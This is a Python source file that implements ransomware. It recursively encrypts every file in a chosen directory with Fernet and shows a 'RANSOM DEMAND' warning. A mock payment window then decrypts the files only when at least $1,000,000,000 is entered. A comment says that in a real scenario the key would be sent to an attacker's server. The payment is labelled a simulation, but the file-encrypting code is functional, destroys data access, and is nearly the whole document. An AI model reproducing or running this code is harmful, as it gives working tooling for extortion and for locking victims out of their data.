import os
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox

# Generate and save the encryption key
key = Fernet.generate_key()
cipher_suite = Fernet(key)
KEY_FILE = "ransom_key.key"

# Save the key to a file (in a real scenario, this would be sent to an attacker's server)
with open(KEY_FILE, "wb") as key_file:
    key_file.write(key)

# Function to encrypt files in the target directory
def encrypt_files(directory):
    """
    Encrypts all files in the specified directory and its subdirectories.
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    file_data = f.read()
                encrypted_data = cipher_suite.encrypt(file_data)
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                print(f"Encrypted: {file_path}")
            except Exception as e:
                print(f"Error encrypting {file_path}: {e}")

# Function to decrypt files in the target directory
def decrypt_files(directory):
    """
    Decrypts all files in the specified directory and its subdirectories.
    """
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                decrypted_data = cipher_suite.decrypt(encrypted_data)
                with open(file_path, "wb") as f:
                    f.write(decrypted_data)
                print(f"Decrypted: {file_path}")
            except Exception as e:
                print(f"Error decrypting {file_path}: {e}")

# Simulate a local transaction (mockup for demo purposes)
def simulate_transaction():
    """
    Creates a simple GUI window to simulate a ransom payment transaction.
    """
    transaction_window = tk.Toplevel()
    transaction_window.title("Ransom Payment")
    transaction_window.geometry("400x200")

    label = tk.Label(transaction_window, text="Enter Payment Details for $1,000,000,000")
    label.pack(pady=10)

    entry = tk.Entry(transaction_window)
    entry.pack(pady=10)

    def complete_payment():
        """
        Simulates a successful payment if the entered amount is at least $1,000,000,000,
        then decrypts files.
        """
        try:
            amount = float(entry.get())
            if amount >= 1_000_000_000:  # Ensure the amount is at least $1 billion
                messagebox.showinfo("Payment Successful", "Transaction completed. Files will be decrypted.")
                transaction_window.destroy()
                decrypt_files(TARGET_DIRECTORY)
            else:
                messagebox.showerror("Error", "Payment must be at least $1,000,000,000. Try again.")
        except ValueError:
            messagebox.showerror("Error", "Invalid input. Please enter a valid number.")

    pay_button = tk.Button(transaction_window, text="Pay Now", command=complete_payment)
    pay_button.pack(pady=10)

    transaction_window.mainloop()

# Display ransom demand dialog box
def show_ransom_dialog():
    """
    Shows a warning dialog box demanding ransom and prompts for payment.
    """
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showwarning(
        "RANSOM DEMAND",
        "All your files have been encrypted!\n"
        "Pay $1,000,000,000 to decrypt your data.\n"
        "Click OK to proceed with payment."
    )
    root.destroy()
    simulate_transaction()

# Main execution
if __name__ == "__main__":
    TARGET_DIRECTORY = "/path/to/target/directory"  # Replace with the actual target directory
    if os.path.exists(TARGET_DIRECTORY):
        print(f"Targeting directory: {TARGET_DIRECTORY}")
        encrypt_files(TARGET_DIRECTORY)
        show_ransom_dialog()
    else:
        print(f"Directory {TARGET_DIRECTORY} does not exist. Please update the path.")
